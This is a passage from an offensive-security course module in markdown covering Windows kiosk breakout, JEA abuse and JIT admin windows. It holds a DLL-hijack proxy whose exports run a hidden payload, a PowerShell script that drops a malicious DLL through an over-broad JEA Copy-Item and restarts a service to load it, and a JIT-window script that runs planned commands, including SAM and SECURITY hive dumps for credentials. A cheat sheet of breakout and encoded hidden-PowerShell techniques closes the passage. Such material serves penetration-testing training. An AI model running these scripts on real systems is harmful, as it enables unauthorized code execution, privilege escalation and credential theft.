            VerQueryValueWDelegate real = Resolve<VerQueryValueWDelegate>("VerQueryValueW");
            return real != null ? real(block, subBlock, out buffer, out len) : false;
        }

        [DllExport("VerQueryValueA", CallingConvention = CallingConvention.StdCall)]
        public static bool VerQueryValueA(byte[] block, string subBlock, out IntPtr buffer, out uint len)
        {
            Payload.Run();
            VerQueryValueADelegate real = Resolve<VerQueryValueADelegate>("VerQueryValueA");
            return real != null ? real(block, subBlock, out buffer, out len) : false;
        }
    }
}
````

:::

::: details `m14-jea-file-copy.ps1` · click to expand

````powershell
<#
Purpose: automate the "JEA over-permissive file copy" exploit - connect to the restricted JEA endpoint, enumerate the available commands, harmlessly probe the boundary,
      drop a malicious DLL into a service load directory, and try to trigger the load with Restart-Service.
Scenario: scenario 42 (docs/14-kiosk-jea-jit.md). The role capability is too broad: it allows Copy-Item and -Destination
      is not restricted to safe directories; this script does not rely on executing arbitrary code inside the session.
Requires: PowerShell 5.1+ on the attacker machine; WinRM 5985/5986 open on the target; a JEA endpoint whose Permission includes this account;
      stage the harmless probe and DLL in target-local paths readable by the JEA session before running.
      Local logic stays in FullLanguage; Import-PSSession proxies invoke only the exposed remote cmdlets.
Usage:
  .\m14-jea-file-copy.ps1 -Target TARGET -Endpoint <JEAendpoint name> -Domain DOMAIN -User USER `
      -Pass 'PASS' -ProbeSource 'C:\shares\home\USER\probe.txt' `
      -StagedPayload 'C:\shares\home\USER\evil.dll' -RemoteDir 'C:\Program Files\<Vendor>' `
      -RemoteName 'version.dll' -ServiceName '<svc>' [-ForceRestart] [-ProbeOnly]
  Notes: -ProbeOnly only does two things - "enumerate the commands + write a harmless probe" - and does not drop the real payload; use it to confirm the boundary.
       NTHASH logon is not supported over a direct native WinRM connection; see the -NTHash parameter notes.
Placeholders: LHOST LPORT TARGET DOMAIN USER PASS NTHASH PAYLOAD - all passed in as command-line parameters.
Test status: not tested (depends on the target's JEA configuration; per section 42 of the doc, verify the boundary under -ProbeOnly first).
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory)][string]$Target,      # target host name/IP (TARGET)
    [Parameter(Mandatory)][string]$Endpoint,    # JEA session configuration name, such as BackupMaintenance
    [Parameter(Mandatory)][string]$Domain,      # domain name (DOMAIN)
    [Parameter(Mandatory)][string]$User,        # JEA role member account (USER)
    [string]$Pass,                              # cleartext password (PASS); mutually exclusive with -NTHash
    [string]$NTHash,                            # NTHASH: informational only (WinRM does not support direct hash logon)
    [Parameter(Mandatory)][string]$ProbeSource, # target-local, pre-staged harmless file
    [string]$StagedPayload,                     # target-local, pre-staged DLL path (not an attacker-local path)
    [Parameter(Mandatory)][string]$RemoteDir,   # target delivery directory (service exe/plug-in directory)
    [string]$RemoteName,                        # file name after delivery (the dependency name the host is missing)
    [string]$ServiceName,                       # service to restart as the trigger
    [switch]$ForceRestart,                      # call Restart-Service after delivery
    [switch]$ProbeOnly                          # probe the boundary only; do not drop the real payload
)

$ErrorActionPreference = 'Stop'

function New-DomainCred {
    param([string]$Account, [string]$Password)
    $secure = ConvertTo-SecureString $Password -AsPlainText -Force
    New-Object System.Management.Automation.PSCredential($Account, $secure)
}

function Write-Step {
    param([string]$Message, [ConsoleColor]$Color = 'Gray')
    Write-Host ("[+] " + $Message) -ForegroundColor $Color
}

# ---- 0. Parameter check ----
if (-not $Pass) {
    if ($NTHash) {
        Write-Warning "WinRM/JEA native login does not support direct transmission of NTHASH. Alternative:"
        Write-Warning "1) Use m15’s evil-winrm idea with hashing (evil-winrm supports NTLM hashing);"
        Write-Warning "2) First exchange NTHASH for tickets/exchange plaintext (such as Rubeus asktgt + s4u and then use Kerberos)."
        Write-Warning "This script requires -Pass clear text password for New-PSSession."
        exit 1
    }
    throw "-Pass (clear text password) is missing."
}
if (-not $ProbeOnly -and (-not $StagedPayload -or -not $RemoteName)) {
    throw "-StagedPayload and -RemoteName must be provided in non-ProbeOnly mode."
}

$account = "$Domain\$User"
$cred = New-DomainCred -Account $account -Password $Pass

# ---- 1. Establish JEA session ----
Write-Step "Connect to JEA endpoint: $Target / $Endpoint (account $account)" 'Cyan'
$session = $null
try {
    $session = New-PSSession -ComputerName $Target -ConfigurationName $Endpoint `
        -Credential $cred -ErrorAction Stop
}
catch {
    Write-Host "[!] Connection failed: $($_.Exception.Message)" -ForegroundColor 'Red'
    Write-Host "Check: whether the endpoint name/account is in the Permission of the endpoint/whether WinRM is reachable/whether HTTPS is required."
    exit 1
}

# ---- 2. Enumerate the commands available in the session (what you can see is what can be used) ----
Write-Step "Enumerate available commands within a session:" 
$allowed = Invoke-Command -Session $session -ScriptBlock { Get-Command }
# Filtering, property access and sorting happen locally, not inside NoLanguage.
$allowed = $allowed | Select-Object Name, CommandType, Source | Sort-Object Name
$allowed | Format-Table -AutoSize | Out-String | Write-Host
$hasCopy   = [bool]($allowed | Where-Object { $_.Name -eq 'Copy-Item' })
$hasRestart = [bool]($allowed | Where-Object { $_.Name -eq 'Restart-Service' })
$hasStop    = [bool]($allowed | Where-Object { $_.Name -eq 'Stop-Service' })
$hasStart   = [bool]($allowed | Where-Object { $_.Name -eq 'Start-Service' })

if (-not $hasCopy) {
    Write-Host "[!] There is no Copy-Item in the session - this endpoint capability is not applicable to this attack, exit." -ForegroundColor 'Red'
    Remove-PSSession $session
    exit 1
}

# Import only role-added commands; remote calls stay command-only in NoLanguage.
$proxyNames = @('Copy-Item')
if ($hasRestart) { $proxyNames += 'Restart-Service' }
if ($hasStop) { $proxyNames += 'Stop-Service' }
if ($hasStart) { $proxyNames += 'Start-Service' }
try {
    $proxyModule = Import-PSSession -Session $session -CommandName $proxyNames -Prefix JEA -ErrorAction Stop
}
catch {
    Remove-PSSession $session
    throw
}

# ---- 3. Copy the pre-staged harmless probe to the target directory ----
$probe = "m14probe_$([guid]::NewGuid().ToString('N').Substring(0,8)).txt"
Write-Step "Probe the boundary: Copy-Item probe -> $RemoteDir\$probe"
$probeOk = $false
try {
    Copy-JEAItem -Path $ProbeSource -Destination (Join-Path $RemoteDir $probe) -ErrorAction Stop
    $probeOk = $true
    Write-Step "Probe writing successful: $RemoteDir\$probe (directory is within replication capability)" 'Green'
}
catch {
    Write-Host "[!] Probe writing failed: $($_.Exception.Message)" -ForegroundColor 'Yellow'
    Write-Host "The directory may be excluded or unwritable, change the directory and try again; or read the role capability .psrc to find the allowed path."
}

if ($ProbeOnly) {
    Write-Step "ProbeOnly: That’s it. The probe can be cleaned up (if the session allows Remove-Item), otherwise the recorded path will be processed afterwards."
    Remove-Module $proxyModule -ErrorAction SilentlyContinue
    Remove-PSSession $session
    if (-not $probeOk) { exit 1 }
    exit 0
}
if (-not $probeOk) {
    Write-Host "[!] Boundary detection failed, the payload was not delivered, and exited. Rerunable -ProbeOnly troubleshooting." -ForegroundColor 'Red'
    Remove-Module $proxyModule -ErrorAction SilentlyContinue
    Remove-PSSession $session
    exit 1
}

# ---- 4. Deliver malicious DLL ----
Write-Step "Deliver payload: $StagedPayload -> $RemoteDir\$RemoteName"
try {
    Copy-JEAItem -Path $StagedPayload -Destination (Join-Path $RemoteDir $RemoteName) -ErrorAction Stop
    Write-Step "DLL written: $RemoteDir\$RemoteName (waiting for trigger)" 'Green'
}
catch {
    Write-Host "[!] Delivery failed: $($_.Exception.Message)" -ForegroundColor 'Red'
    Remove-Module $proxyModule -ErrorAction SilentlyContinue
    Remove-PSSession $session
    exit 1
}

# ---- 5. Trigger loading ----
if ($ServiceName -and $ForceRestart -and ($hasRestart -or ($hasStop -and $hasStart))) {
    Write-Step "Trigger: Restart/start/stop service $ServiceName"
    try {
        if ($hasRestart) {
            Restart-JEAService -Name $ServiceName -ErrorAction Stop
        }
        elseif ($hasStop -and $hasStart) {
            Stop-JEAService -Name $ServiceName -ErrorAction Stop
            Start-JEAService -Name $ServiceName -ErrorAction Stop
        }
        Write-Step "The service has been restarted and the DLL should have been loaded (reconnect window 30–60s)" 'Green'
    }
    catch {
        Write-Host "[!] Service triggering failed: $($_.Exception.Message)" -ForegroundColor 'Yellow'
        Write-Host "Alternative: Wait for automatic restart/administrator restart; or change to event triggering (login script/scheduled task/Startup) according to the document."
    }
}
else {
    Write-Step "No service control command or -ForceRestart is not specified: Wait for the service to automatically restart/trigger by the administrator (keep listening)."
}

Write-Step "Finish. If the DLL is reconnected successfully, please check whoami (should be the service account); remember to restore the overwritten files."
Remove-Module $proxyModule -ErrorAction SilentlyContinue
Remove-PSSession $session
````

:::

## JIT admin window

If access is granted only for a short window, don't improvise inside it. Request or wait for approval, purge tickets so the new group SID is in a fresh TGT, open a new session, then run the pre-planned commands.

PEN-300 §23.3 uses a custom JIT request app on top of the Privileged Access Management (PAM) optional feature. After approval, the current ticket still lacks the new group — `klist purge`, then `Enter-PSSession` (or log out and back in) so the KDC issues a TGT that includes it.

With PAM TTL memberships (including expiring shadow-principal links), the KDC limits the TGT to the shortest remaining membership TTL; an existing logon token/session may persist, but that does not prove a valid ticket or fresh remote access — get results out inside the approved window.

- [ ] Enumerate whether PAM / a JIT portal is in play (`Get-ADOptionalFeature`, groups, GPOs, browser history)
- [ ] Pre-plan the in-window command list (results first, persistence last) and start a listener
- [ ] Request or wait for approval; poll group membership or watch 4728/4729
- [ ] When the window opens: `klist purge`, then a new logon / `Enter-PSSession` / `runas`
- [ ] Confirm `whoami /groups` contains the privileged group, then run the list
- [ ] After the window, check whether any leftover session or ticket still works — if it does, finish quickly; if it does not, you should already have the loot

Enumerate the optional feature and group state (any domain user can read this; RSAT is not required if you can load the DLL):

```powershell
# course used C:\Tools\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\Tools\Microsoft.ActiveDirectory.Management.dll
Get-Command -Module Microsoft.ActiveDirectory.Management | Where-Object { $_.Name -like "Get-*" }
Get-ADOptionalFeature -Filter *
# look for: Name = Privileged Access Management Feature, IsDisableable = False

Get-ADGroupMember -Identity 'JIT-Admins' -Server DC
# without the AD module, use ADSI (m14-jit-admin-window.ps1) or:
net group "JIT-Admins" /domain
net localgroup Administrators     # local JIT on a host you already control
```

PAM enabled is not proof JIT is in use. Also check users, groups, GPO `Groups.xml`, description fields, and browser history for a request portal (the course found one at `http://mgmt01`). Some portals auto-approve; most need a second account to approve — you may have to compromise an approver first.

```powershell
# status / poll / refresh / run — m14-jit-admin-window.ps1
powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode Status -Domain DOMAIN -User USER -Group 'JIT-Admins'
powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode Wait -WindowSec 900 -PollSeconds 10 -CommandFile C:\Users\public\jit-cmds.txt
```

Poll at ≥5–10s (faster only around the expected window). Event 4728 (member added to a global group) / 4729 (removed) live on the DC security log — query the DC, don't sweep random hosts.

When the window opens, the existing token does not contain the new SID (`whoami /groups` will not show it). Refresh, then verify:

```powershell
klist purge
# then a new network logon — Enter-PSSession triggers a new TGT with current group SIDs
Enter-PSSession -ComputerName TARGET
whoami /groups
# alternatives: runas /user:DOMAIN\USER cmd.exe, or log out and back in
```

`gpupdate /force` can help pull new group policy / membership; the course path is `klist purge` plus a new logon. If a new interactive logon is forbidden, try S4U (`Rubeus asktgt` / `s4u`) so the privileged SID is baked into a usable ticket.

Run the pre-planned list inside the window, shortest commands first:

```text
whoami /groups | findstr /I "JIT"
# 1) privileged credentials, sent back immediately (see module 07) — usable after the window closes
# 2) high-priv files / backups / registry, exfiltrated
# 3) optional, last: persistence (scheduled task / service / a long-lived group) — audit risk, confirm first
reg save HKLM\SAM C:\Users\Public\sam.save /y
reg save HKLM\SECURITY C:\Users\Public\sec.save /y
```

Get results first, talk persistence later. Do not assume a ticket or remote session outlives the window: ordinary group removal and PAM TTL expiry are different. The script's `-Mode Run` / `-Mode Wait` will execute `-CommandFile` (one command per line) and then inspect the current process token; that inspection alone cannot validate remote access.

If group membership and the event log are unreadable, camp on the documented activation time and try a new token at high frequency, validating with `whoami /groups`. If the authorized object is not an account you control, take over that account first, then return to this flow. If leftover tickets die the moment the window closes (short TGT, forced logoff, or PAM expiry), concentrate output inside the window.

High-frequency LDAP polling leaves logs — keep the interval sane. Credential dumps and persistence inside the window are recorded in the JIT session audit. Do not ride a leftover ticket until the second before it expires; once you have confirmed it works, extract and move on.

::: details `m14-jit-admin-window.ps1` · click to expand

````powershell
<#
Purpose: combat script for a temporary JIT admin window - query the authorization state (AD group membership + the current token's groups), refresh tickets (klist purge / gpupdate),
      run the "pre-planned command list" in order inside the countdown window, and when the window closes check whether the residual token still carries the privileged SID.
Scenario: 43 (temporary JIT admin rights are approved, but stay valid for only a short time)
Requires: Windows PowerShell 3.0+; readable LDAP (389) in the domain or Get-ADGroupMember available; gpupdate / klist (built into Windows)
Usage:
  powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode Status
  powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode Status -Domain DOMAIN -User USER -Group 'JIT-Admins'
  powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode Refresh
  powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode Wait -WindowSec 900 -PollSeconds 10
  powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode Run -CommandFile C:\Users\public\jit-cmds.txt -WindowSec 300
Placeholders: DOMAIN=AD domain name; USER=the account that will be JIT-authorized; TARGET=target machine; PAYLOAD=the planned command list file (one command per line)
Test status: not measured on Windows; written for PowerShell 3.0+ syntax (use Get-Help .\m14-jit-admin-window.ps1 -Full for the instructions)
#>
[CmdletBinding()]
param(
    [ValidateSet('Status', 'Refresh', 'Wait', 'Run')]
    [string]$Mode = 'Status',

    [string]$Domain = 'DOMAIN',
    [string]$User = 'USER',
    [string]$Group = 'JIT-Admins',
    [string]$Computer = 'TARGET',

    [string]$CommandFile = 'PAYLOAD',
    [int]$WindowSec = 300,
    [int]$PollSeconds = 15,
    [int]$DeadlineSec = 1800,

    [string]$LogFile = (Join-Path $env:TEMP 'm14-jit-admin-window.log'),
    [switch]$Help
)

function Write-Log {
    param([string]$Message, [string]$Level = 'INFO')
    $line = "{0} [{1}] {2}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Level, $Message
    Write-Output $line
    try { Add-Content -Path $LogFile -Value $line -ErrorAction Stop } catch { }
}

function Get-TokenGroups {
    $out = & whoami /groups 2>$null
    if (-not $out) { $out = @() }
    return $out
}

function Test-TokenHasGroup {
    param([string]$GroupName)
    $groups = Get-TokenGroups
    if (-not $groups) { return $false }
    return [bool]($groups | Select-String -Pattern ([regex]::Escape($GroupName)) -SimpleMatch:$false)
}

# Use ADSI to read group members (readable by any domain user, no AD module required); if failed, return to net group
function Test-GroupMembership {
    param([string]$DomainName, [string]$UserName, [string]$GroupName)

    try {
        $root = [ADSI]"LDAP://$DomainName"
        $gs = New-Object System.DirectoryServices.DirectorySearcher($root)
        $gs.Filter = "(&(objectCategory=group)(cn=$GroupName))"
        [void]$gs.PropertiesToLoad.Add('member')
        $g = $gs.FindOne()
        if (-not $g) { Write-Log "LDAP group not found: $GroupName" 'WARN'; return $null }

        $us = New-Object System.DirectoryServices.DirectorySearcher($root)
        $us.Filter = "(&(objectCategory=user)(sAMAccountName=$UserName))"
        [void]$us.PropertiesToLoad.Add('distinguishedName')
        $u = $us.FindOne()
        if (-not $u) { Write-Log "LDAP not found user: $UserName" 'WARN'; return $null }

        $userDn = [string]$u.Properties['distinguishedname'][0]
        $members = @($g.Properties['member'])
        $inGroup = ($members -contains $userDn)
        Write-Log ("AD group membership determination: {0} in {1} = {2}" -f $UserName, $GroupName, $inGroup)
        return $inGroup
    } catch {
        Write-Log ("ADSI query failed and returned to net group: {0}" -f $_.Exception.Message) 'WARN'
        try {
            $raw = & net group "$GroupName" /domain 2>$null
            $inGroup = [bool]($raw | Select-String -Pattern ("\b" + [regex]::Escape($UserName) + "\b"))
            Write-Log ("net group judgment: {0} in {1} = {2}" -f $UserName, $GroupName, $inGroup)
            return $inGroup
        } catch {
            Write-Log "Group membership query not available (both LDAP and net group failed)" 'WARN'
            return $null
        }
    }
}

function Get-JitAuthStatus {
    Write-Log '=== Authorization status ==='
    Write-Log ("Current status:" + (& whoami))
    Write-Log ("Target machine:" + $Computer)

    $inGroup = Test-GroupMembership -DomainName $Domain -UserName $User -GroupName $Group
    if ($inGroup -eq $true) { Write-Log "[IN ] Group members: Already in $Group (authorization approved)" }
    elseif ($inGroup -eq $false) { Write-Log "[OUT] Group member: Not in $Group (not authorized yet or has expired)" }
    else { Write-Log "[??] Group members: Unable to determine" }

    $inToken = Test-TokenHasGroup -GroupName $Group
    if ($inToken) { Write-Log "[IN ] Current token: already contains $Group (can be used directly with high authority)" }
    else { Write-Log "[OUT] Current token: does not contain $Group (the old token does not contain the newly added group SID, a new token is required)" }

    Write-Log '=== Kerberos Tickets ==='
    try { & klist 2>$null | ForEach-Object { Write-Log ("  " + $_) } }
    catch { Write-Log 'klist is not available' 'WARN' }

    Write-Log '=== Security log 4728/4729 (member addition/removal) ==='
    try {
        $events = Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4728, 4729; StartTime = (Get-Date).AddHours(-6) } -MaxEvents 20 -ErrorAction Stop
        foreach ($e in $events) {
            $msg = ($e.Message -split "`r?`n") | Where-Object { $_ -match 'Member|Account|Group' } | Select-Object -First 3
            Write-Log ("  {0} id={1} {2}" -f $e.TimeCreated, $e.Id, ($msg -join ' | '))
        }
        if (-not $events) { Write-Log 'No 4728/4729 in the past 6 hours (may not be checked on the domain controller)' }
    } catch {
        Write-Log ('Event log reading failed (need to check on the local administrator or domain controller):' + $_.Exception.Message) 'WARN'
    }
}

# Refresh tickets: group members change ≠ existing tokens change immediately, and tickets must be obtained again
function Invoke-TokenRefresh {
    Write-Log '=== Refresh authentication status ==='
    Write-Log 'Step 1: klist purge (clear old TGT/service tickets and force re-application next time)'
    & klist purge 2>&1 | ForEach-Object { Write-Log ("  " + $_) }

    Write-Log 'Step 2: gpupdate /force (pull new group policy/group members)'
    & gpupdate /force 2>&1 | ForEach-Object { Write-Log ("  " + $_) }

    Write-Log 'Step 3: Trigger a network login to get a new token (new PSSession / new runas / re-authentication to the target machine)'
    Write-Log ("Suggestion: Enter-PSSession -ComputerName $Computer or runas /user:$Domain\$User cmd.exe")

    Write-Log 'Step 4: Review the new token'
    $inToken = Test-TokenHasGroup -GroupName $Group
    if ($inToken) { Write-Log '[+] The new token already contains a high-privilege group and can start executing specified commands.' }
    else { Write-Log '[-] The new token still does not contain the high authority group: confirm whether the authorization is effective and whether the ticket has been re-issued' 'WARN' }
    return $inToken
}

function Invoke-PlannedCommands {
    param([string]$File, [int]$WindowSeconds)

    if (-not (Test-Path $File)) {
        Write-Log "Command list not found: $File" 'WARN'
        Write-Log 'The recommended command in the window (get the results first, then talk about persistence), write one line per line into the file:'
        Write-Log '  whoami /groups | findstr /I "JIT"'
        Write-Log '  reg save HKLM\SAM C:\Users\Public\sam.save /y'
        Write-Log '  reg save HKLM\SECURITY C:\Users\Public\sec.save /y'
        Write-Log '  nltest /domain_trusts'
        return
    }

    $deadline = (Get-Date).AddSeconds($WindowSeconds)
    $cmds = Get-Content -Path $File | Where-Object { $_.Trim() -and -not $_.Trim().StartsWith('#') }
    Write-Log ("=== Execute {0} scheduled commands within the window (remaining window {1} seconds) ===" -f $cmds.Count, $WindowSeconds)

    foreach ($c in $cmds) {
        $left = [int]($deadline - (Get-Date)).TotalSeconds
        if ($left -le 0) { Write-Log 'The window has expired, stop executing remaining commands' 'WARN'; break }
        Write-Log ("[{0}s remaining] Execution: {1}" -f $left, $c)
        $sw = [System.Diagnostics.Stopwatch]::StartNew()
        try {
            $out = Invoke-Expression -Command $c 2>&1 | Out-String
            $sw.Stop()
            Write-Log ("Complete({0:N1}s) output: {1}" -f $sw.Elapsed.TotalSeconds, ($out.Trim() -replace "`r?`n", ' / '))
        } catch {
            $sw.Stop()
            Write-Log ("Failure({0:N1}s): {1}" -f $sw.Elapsed.TotalSeconds, $_.Exception.Message) 'ERROR'
        }
    }
    Write-Log 'The action in the window is completed'
}

function Start-JitCountdown {
    param([int]$Seconds)
    Write-Log ("Countdown {0} seconds (dot every 10 seconds; window is short, don’t think about commands on the spot)" -f $Seconds)
    $end = (Get-Date).AddSeconds($Seconds)
    $next = (Get-Date).AddSeconds(10)
    while ((Get-Date) -lt $end) {
        Start-Sleep -Seconds 1
        if ((Get-Date) -ge $next) {
            $left = [int]($end - (Get-Date)).TotalSeconds
            if ($left -gt 0) { Write-Log ("...{0} seconds remaining" -f $left) }
            $next = (Get-Date).AddSeconds(10)
        }
    }
    Write-Log 'Countdown ends: Check the remaining tokens after exiting the window'
    $inToken = Test-TokenHasGroup -GroupName $Group
    if ($inToken) { Write-Log '[!] The current process token still contains the group SID; this does not prove an unexpired Kerberos ticket or new remote access. PAM TTL can expire tickets at window end.' 'WARN' }
    else { Write-Log '[-] The current process token does not contain the group; this check says nothing about other sessions or tickets.' 'WARN' }
}

function Start-JitWait {
    param([int]$Timeout, [int]$Interval)
    Write-Log ("Polling to wait for authorization to enter the window (up to {0} seconds, once every {1} seconds; interval ≥5-10s to avoid flushing LDAP logs)" -f $Timeout, $Interval)
    $deadline = (Get-Date).AddSeconds($Timeout)
    while ((Get-Date) -lt $deadline) {
        $inGroup = Test-GroupMembership -DomainName $Domain -UserName $User -GroupName $Group
        if ($inGroup -eq $true) {
            Write-Log '[+] When a window entry is detected, the ticket will be refreshed immediately and the specified command will be executed.'
            if (Invoke-TokenRefresh) {
                Invoke-PlannedCommands -File $CommandFile -WindowSeconds $WindowSec
                Start-JitCountdown -Seconds $WindowSec
            }
            return
        }
        Write-Log ("[*] {0} has not entered the window yet, waiting..." -f (Get-Date -Format 'HH:mm:ss'))
        Start-Sleep -Seconds $Interval
    }
    Write-Log '[-] Timeout: No window entry detected (check JIT activation time, or use event log 4728 to observe instead)' 'WARN'
}

if ($Help) {
    Write-Output @'
Usage: powershell -ep bypass -f m14-jit-admin-window.ps1 -Mode <Status|Refresh|Wait|Run> [parameters]

  -Mode Status    query the authorization state: AD group membership, whether the current token contains the privileged group, klist tickets, security log 4728/4729
  -Mode Refresh   refresh the authentication state: klist purge -> gpupdate /force -> new logon to get a new token -> re-check
  -Mode Wait      poll and wait for the window (-DeadlineSec); on entry refresh tickets, run -CommandFile, count down and check the residual token
  -Mode Run       assume you are already inside the window: refresh -> re-check -> run the planned command list within -WindowSec seconds

  -Domain DOMAIN        AD domain name      -User USER      account that will be JIT-authorized
  -Group 'JIT-Admins'   privileged group name     -Computer TARGET target machine
  -CommandFile PAYLOAD  planned in-window command list (one per line, # starts a comment)
  -WindowSec 300        time budget for in-window actions    -DeadlineSec 1800  total polling time for Wait mode
'@
    exit 0
}

Write-Log ("=== m14-jit-admin-window startup: Mode={0} Domain={1} User={2} Group={3} ===" -f $Mode, $Domain, $User, $Group)

switch ($Mode) {
    'Status'  { Get-JitAuthStatus }
    'Refresh' { [void](Invoke-TokenRefresh) }
    'Wait'    { Start-JitWait -Timeout $DeadlineSec -Interval $PollSeconds }
    'Run'     {
        if (Invoke-TokenRefresh) {
            Invoke-PlannedCommands -File $CommandFile -WindowSeconds $WindowSec
            Start-JitCountdown -Seconds $WindowSec
        } else {
            Write-Log 'After the token is refreshed, it still does not contain the high-privilege group: first confirm the authorization status (-Mode Status) before executing, do not try and make mistakes in the window' 'ERROR'
        }
    }
}

Write-Log ("=== End, log position: {0} ===" -f $LogFile)
````

:::

## Cheat sheet

| You want to… | Use |
|---|---|
| Kiosk: most common channel | File dialog address bar → `C:\Windows\System32` → `cmd.exe` (or `%COMSPEC%` / `shell:System` / `\\127.0.0.1\C$`) |
| Kiosk: after execution | One pre-assembled `powershell -nop -w hidden -enc …` or in-memory IEX; tick `m14-kiosk-breakout.md` |
| JEA: find the endpoint | PS history (`ConsoleHost_history.txt`) for `Enter-PSSession -ConfigurationName` |
| JEA: what you can run | `Get-Command` in the session (NoLanguageMode — no `whoami.exe`, no .NET) |
| JEA: land code | `Copy-Item` a missing-dependency DLL into the service directory; wait for or trigger a restart |
| JIT: is PAM on? | `Get-ADOptionalFeature -Filter *` |
| JIT: use the window | Approve → `klist purge` → `Enter-PSSession` → confirm `whoami /groups` → run the prepared list (`m14-jit-admin-window.ps1`) |
